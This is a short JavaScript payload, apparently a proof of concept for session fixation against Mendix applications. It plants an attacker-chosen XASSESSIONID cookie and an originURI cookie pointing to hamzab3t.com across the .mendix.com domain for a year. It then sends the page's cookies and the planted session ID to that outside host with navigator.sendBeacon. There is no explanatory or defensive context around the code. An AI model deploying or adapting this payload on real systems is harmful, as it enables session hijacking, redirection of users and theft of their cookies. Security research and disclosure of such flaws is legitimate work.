var ATTACKER_SID = "c8ee8838-a6d3-4ec8-815b-e6715b15b4ba";
var BEACON = "https://www.hamzab3t.com/collect";
var a = "; Domain=.mendix.com; Path=/; Secure; SameSite=None; Max-Age=31536000";
document.cookie = "XASSESSIONID=" + ATTACKER_SID + a;
document.cookie = "originURI=https://www.hamzab3t.com/x" + a;
try { navigator.sendBeacon(BEACON, JSON.stringify({cookies: document.cookie, planted: ATTACKER_SID})); } catch (e) {}
